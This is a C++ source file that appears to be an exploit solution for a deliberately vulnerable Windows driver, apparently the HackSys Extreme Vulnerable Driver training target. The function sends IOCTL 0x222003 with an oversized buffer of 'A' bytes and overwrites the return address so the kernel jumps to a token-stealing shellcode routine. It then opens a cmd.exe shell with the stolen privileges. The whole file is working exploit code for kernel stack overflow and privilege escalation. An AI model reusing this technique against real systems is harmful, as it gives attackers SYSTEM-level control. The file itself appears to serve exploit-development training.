#include <Windows.h>
#include <iostream>

#include "Solutions.h"
#include "ioctal_codes.h"
#include "utils.h"

using namespace std;

NTSTATUS Solutions::TriggerStackBufferOverflow() {
	DWORD dwBufSize = 0x820 + sizeof(DWORD);
	PUCHAR lpInBuffer = NULL;
	DWORD dwIoctl = IOCTL_STACK_OVERFLOW;
	DWORD dwBytesReturned = 0;

	cout << "[+] Device Handle " << hex << _hDeviceHandle << endl;

	lpInBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufSize);

	if (!lpInBuffer) {
		cout << "[!] Failed to allocate memory - " << GetLastError() << endl;
		HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);
		return 1;
	}

	RtlFillMemory(lpInBuffer, dwBufSize - 4, 0x41); // fill buffer with 'A'

	lpInBuffer[0x820] = (DWORD)&tokenStealingShellcode & 0xFF;
	lpInBuffer[0x821] = ((DWORD)&tokenStealingShellcode & 0xFF00) >> 8;
	lpInBuffer[0x822] = ((DWORD)&tokenStealingShellcode & 0xFF0000) >> 16;
	lpInBuffer[0x823] = ((DWORD)&tokenStealingShellcode & 0xFF000000) >> 24;

	cout << "[+] Sending IOCTL request with ioctl: 0x222003" << endl;
	cout << "[+] Buffer size: " << dwBufSize << endl;
	cout << "[+] Jumping to shellcode " << hex << (DWORD)&tokenStealingShellcode << endl;

	if (!DeviceIoControl(_hDeviceHandle,
		dwIoctl,
		(LPVOID)lpInBuffer,
		dwBufSize, NULL, 0, &dwBytesReturned, NULL))
	{
		cout << "[-] ERROR: " << GetLastError << " - could not talk with the driver" << endl;
		HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);
		return 1;
	}

	cout << "[+] Talked succesfully with the driver" << endl;

	system("cmd.exe");

	HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);
}